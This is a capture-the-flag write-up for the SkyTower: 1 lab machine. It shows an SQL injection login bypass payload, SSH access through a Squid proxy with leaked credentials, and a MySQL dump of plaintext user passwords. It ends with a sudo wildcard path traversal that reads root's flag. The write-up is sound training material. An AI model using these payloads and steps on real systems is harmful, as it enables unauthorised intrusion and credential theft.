# SkyTower: 1 Writeup
\
After scanning we see port 80 and 3128 open

```bash
Open 192.168.1.13:80
Open 192.168.1.13:3128
```
\
After using nmap to fingerprint the services, we find

```
port 80    http Apache
port 3128  http-proxy Squid http proxy 3.1.20
```
\
On port 80 we see a simple login screen
\
<img width="1528" height="731" alt="image" src="https://github.com/user-attachments/assets/8c861eaa-a625-4005-802b-a89cdb1303e5" />
\
since there was not much in the source code as well , i tried SQL injection
\
<img width="1406" height="64" alt="image" src="https://github.com/user-attachments/assets/2f4d6e5d-7d42-4c3f-9a3f-9554fbf31d2d" />
\
It showed an error, and the payload i used to bypass it is 

```bash
'||1=1#
```
\
we see a text box 
\
<img width="511" height="543" alt="image" src="https://github.com/user-attachments/assets/8f6a5387-f0c7-48d9-a8b1-3eb6ea3fed5a" />
\
we find ssh credentials john:hereisjohn , but port 22 is not open, so lets add the squid proxy in our /etc/proxychains4.conf 
\
<img width="375" height="171" alt="image" src="https://github.com/user-attachments/assets/d43382ad-bf49-4d27-be5f-e6b26bcfa7bf" />
\
Comment the other proxies which we do not wish to use right now , now we try to access ssh by 

```bash
proxychains ssh john@192.168.1.13
```
but it kept closing the connection
\
<img width="659" height="139" alt="image" src="https://github.com/user-attachments/assets/beaaf66c-0210-481b-8310-83c15d6dc1d4" />
\
So we try to change into another sh shell by using -t option

```bash
proxychains ssh john@192.168.1.13 -t '/bin/sh'
```
\
we can notice that at the end of .bashrc file there is an "exit" which was why our connection was closing 
\
since .bashrc is a configuratio file that runs everytime a new bash shell opens , so it was basically opening and exiting.
\
<img width="275" height="58" alt="image" src="https://github.com/user-attachments/assets/9da0f0f8-cb8b-426f-aa16-3407a1755966" />
\
We can just remove the last "exit" line and ssh again using
```bash
proxychains ssh john@192.168.1.13
```
\
This time we have a stable shell, now we enumerate the fle system , we find a login.php at /var/www
\
<img width="802" height="554" alt="image" src="https://github.com/user-attachments/assets/f3b35329-867c-4782-a5eb-1d8639166f68" />
\
We can see that it is making a db connection to mysql using the credentials root:root and the database SkyTech
\
and after checking the users table in the database

```bash
+----+---------------------+--------------+
| id | email               | password     |
+----+---------------------+--------------+
|  1 | john@skytech.com    | hereisjohn   |
|  2 | sara@skytech.com    | ihatethisjob |
|  3 | william@skytech.com | senseable    |
+----+---------------------+--------------+
```
\
We now have password of sara also , so lets ssh in as sara
\
We notice the same problem for user sara as well , so lets do the same steps and get a bash shell
\
after checking sudo -l, we see that sara has some specific permissions
\
<img width="894" height="123" alt="image" src="https://github.com/user-attachments/assets/46ef34c1-32dc-41c6-b30e-0845a9741c05" />
\
the user sara can run these two commands as root user without password

```bash
/bin/cat /accounts/*
/bin/ls /accounts/*
```
\
So , we can try path traversal 

```bash
sudo -u root /bin/ls /accounts/../root/
```
\
We find a flag.txt , so we try to read it 

```bash
sudo -u root /bin/cat /accounts/../root/flag.txt
```
\
<img width="551" height="120" alt="image" src="https://github.com/user-attachments/assets/9f5937bb-99ac-47e1-86ce-b6d5726e9fb4" />
\
So we become root \
The End , Thank You for reading till the end.
